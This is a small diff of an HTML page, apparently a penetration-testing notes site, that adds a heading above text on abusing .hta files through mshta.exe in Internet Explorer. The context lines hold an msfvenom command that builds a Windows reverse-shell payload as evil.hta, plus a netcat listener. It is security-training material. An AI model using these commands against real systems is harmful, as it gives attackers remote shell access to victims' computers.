@@ -173,7 +173,8 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p>If a file is created with the extension of <em><strong>.hta</strong></em> instead of <em><strong>.html</strong></em>, Internet Explorer will automatically interpret it as an HTML Application and offer the ability to execute it using the mshta.exe program. This attack only works for Internet Explorer.</p>
+                        <h2 id="html-file-upload"><a class="header" href="#html-file-upload">HTML File Upload</a></h2>
+<p>If a file is created with the extension of <em><strong>.hta</strong></em> instead of <em><strong>.html</strong></em>, Internet Explorer will automatically interpret it as an HTML Application and offer the ability to execute it using the mshta.exe program. This attack only works for Internet Explorer.</p>
 <pre><code># Crafting a payload and listener
 msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;port&gt; -f hta-psh -o evil.hta
 nc -lnvp 4444
